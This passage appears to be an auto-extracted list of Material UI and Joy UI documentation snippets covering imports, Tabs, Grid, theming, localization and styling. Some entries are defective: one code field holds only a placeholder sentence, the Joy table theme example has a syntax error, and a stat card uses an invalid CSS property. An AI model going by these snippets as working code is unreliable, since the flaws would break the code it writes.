  ({ theme }) => `
  color: ${theme.palette.text.secondary};
`,
);

const StyledTrend = styled(TrendingUpIcon)(
  ({ theme }) => `
  color: ${theme.palette.success.dark};
  font-size: 16px;
  vertical-alignment: sub;
`,
);

const StatValue = styled('div')(
  ({ theme }) => `
  color: ${theme.palette.text.primary};
  font-size: 34px;
  font-weight: ${theme.typography.fontWeightMedium};
`,
);

const StatDiff = styled('div')(
  ({ theme }) => `
  color: ${theme.palette.success.dark};
  display: inline;
  font-weight: ${theme.typography.fontWeightMedium};
  margin-left: ${theme.spacing(0.5)};
  margin-right: ${theme.spacing(0.5)};
`,
);

const StatPrevious = styled('div')(
  ({ theme }) => `
  color: ${theme.palette.text.secondary};
  display: inline;
  font-size: 12px;
`,
);

return (
  <StatWrapper>
    <StatHeader>Sessions</StatHeader>
    <StatValue>98.3 K</StatValue>
    <StyledTrend />
    <StatDiff>18.77%</StatDiff>
    <StatPrevious>vs last week</StatPrevious>
  </StatWrapper>
);

----------------------------------------

TITLE: Installing @mui/styles in npm
DESCRIPTION: Command to install and save @mui/styles as a dependency in package.json.

LANGUAGE: bash
CODE:
npm install @mui/styles@next

----------------------------------------

TITLE: Creating Letter Avatars in React MUI
DESCRIPTION: Letter avatars are created by passing string characters as children to the Avatar component, with optional background colors based on names.

LANGUAGE: JSX
CODE:
LetterAvatars.js and BackgroundLetterAvatars.js referenced but not provided in the input text

----------------------------------------

TITLE: Importing Divider Component in React
DESCRIPTION: Basic import statement for the Material UI Divider component.

LANGUAGE: jsx
CODE:
import Divider from '@mui/material/Divider';

----------------------------------------

TITLE: HTML Structure of Input Component
DESCRIPTION: Shows the basic DOM structure of the Input component with its root and input slots.

LANGUAGE: html
CODE:
<div class="base-Input-root">
  <input class="base-Input-input" />
</div>

----------------------------------------

TITLE: Customizing Input Props
DESCRIPTION: Shows how to pass custom props to internal slots using slotProps.

LANGUAGE: jsx
CODE:
<Input slotProps={{ input: { className: 'my-input' } }} />

----------------------------------------

TITLE: Importing Modal Hook in React
DESCRIPTION: Import statement for the useModal hook, which provides lower-level control over Modal functionality.

LANGUAGE: js
CODE:
import useModal from '@mui/base/unstable_useModal';

----------------------------------------

TITLE: Importing Base Slider Component in React
DESCRIPTION: Basic import statement for the Slider component from MUI Base.

LANGUAGE: jsx
CODE:
import { Slider } from '@mui/base/Slider';

----------------------------------------

TITLE: Custom Theme Extension for Table Borders
DESCRIPTION: Example of extending the Joy UI theme to customize table border styles based on props

LANGUAGE: js
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  components: {
    JoyTable: {
      styleOverrides: {
        root: ({ ownerState }) => ({
          ...(ownerState.borderAxis === 'header' && {
            '& thead th:not([colspan])': {
              borderBottom: '2px solid var(--TableCell-borderColor)',
            },
          }),
        });
      }
    }
  }
})

<CssVarsProvider theme={theme}>…</CssVarsProvider>

----------------------------------------

TITLE: Implementing Disabled Tabs in React
DESCRIPTION: Shows how to disable a specific tab using the 'disabled' prop. This prevents interaction and focus on the disabled tab.

LANGUAGE: jsx
CODE:
<TabList>
  <Tab>First tab</Tab>
  <Tab disabled>Second tab</Tab>
  <Tab>Third tab</Tab>
</TabList>

----------------------------------------

TITLE: Implementing Selection Following Focus - React/JSX
DESCRIPTION: Example of implementing tabs where selection automatically follows focus using the selectionFollowsFocus prop.

LANGUAGE: jsx
CODE:
/* Tabs where selection follows focus */
<Tabs selectionFollowsFocus />

----------------------------------------

TITLE: Material UI Theme Breakpoint Integration
DESCRIPTION: Example demonstrating how to use Material UI's breakpoint helpers with useMediaQuery hook.

LANGUAGE: jsx
CODE:
import { useTheme } from '@mui/material/styles';
import useMediaQuery from '@mui/material/useMediaQuery';

function MyComponent() {
  const theme = useTheme();
  const matches = useMediaQuery(theme.breakpoints.up('sm'));

  return <span>{`theme.breakpoints.up('sm') matches: ${matches}`}</span>;
}

----------------------------------------

TITLE: Nested Grid Implementation Example
DESCRIPTION: Shows how to implement nested grids with inherited spacing in Grid v2

LANGUAGE: javascript
CODE:
import Grid from '@mui/material/Unstable_Grid2';

// root grid container
<Grid container spacing={2}>
  <Grid>...</Grid>
  <Grid container>
    {/* inherits spacing from the root container */}
    <Grid>...</Grid>
    <Grid>...</Grid>
  </Grid>
  <Grid>...</Grid>
</Grid>;

----------------------------------------

TITLE: Configuring Localization for MUI Components in React
DESCRIPTION: This snippet demonstrates how to set up localization for MUI components including Date Pickers, Data Grid, and core components using the Bulgarian locale. It shows the creation of a custom theme with translations for different MUI packages.

LANGUAGE: jsx
CODE:
import { createTheme, ThemeProvider } from '@mui/material/styles';
import { DataGrid, bgBG as dataGridBgBG } from '@mui/x-data-grid';
import { bgBG as coreBgBG } from '@mui/material/locale';
import bgLocale from 'date-fns/locale/bg';
import { CalendarPicker, LocalizationProvider, bgBG } from '@mui/x-date-pickers';
import { AdapterDayjs } from '@mui/x-date-pickers/AdapterDayjs';

const theme = createTheme(
  {
    palette: {
      primary: { main: '#1976d2' },
    },
  },
  bgBG, // x-date-pickers translations
  dataGridBgBG, // x-data-grid translations
  coreBgBG, // core translations
);

----------------------------------------

TITLE: Styling a Slider Component with Custom Margin in React
DESCRIPTION: This code snippet demonstrates how to add custom margin to a Slider component using the 'sx' prop in a React application. It sets vertical margin to 1 unit (equivalent to 8px) on the Slider.

LANGUAGE: jsx
CODE:
// add margin: 8px 0px;
<Slider sx={{ my: 1 }} />

----------------------------------------

TITLE: Styling with CSS Variables using styled function in Joy UI
DESCRIPTION: This example shows how to use the theme.vars.* notation with the styled function to apply CSS variable-based styles.

LANGUAGE: js
CODE:
const Div = styled('div')(({ theme }) => ({
  // Outputs 'var(--joy-palette-primary-500)'
  color: theme.vars.palette.primary[500],
}));

----------------------------------------

TITLE: Rendering Material UI Example Collection Component in Markdown
DESCRIPTION: This snippet demonstrates how to render a custom React component called MaterialUIExampleCollection within a markdown file. It uses a special syntax to include the component, likely processed by a static site generator or markdown parser.

LANGUAGE: markdown
CODE:
{{"component": "modules/components/MaterialUIExampleCollection"}}